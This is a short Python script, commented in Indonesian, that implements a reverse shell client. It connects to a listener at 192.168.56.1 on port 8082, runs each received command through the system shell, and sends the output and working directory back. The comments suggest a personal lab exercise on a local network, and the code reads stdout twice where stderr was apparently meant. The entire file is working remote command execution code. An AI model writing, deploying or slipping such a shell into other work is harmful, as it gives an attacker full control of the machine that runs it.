import socket
import os
import subprocess

s = socket.socket()
host = '192.168.56.1'  # tiap kali nyalain laptop, liat pake ipconfig di cmd
port = 8082

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        # shell command harus True, untuk akses command seperti dir cls
        # parameter standar I/O stream,  pakai subprocess PIPE
        # Semisal command tidak sesuai/ unrecognized, nnti dihandle subprocess PIPE
        cmd = subprocess.Popen(data[:].decode(
            "utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_b = cmd.stdout.read() + cmd.stdout.read()
        output_str = str(output_b, "utf-8")
        wd = os.getcwd()+">"  # mengambil direkori utama
        s.send(str.encode(output_str+wd))
        print(output_str)
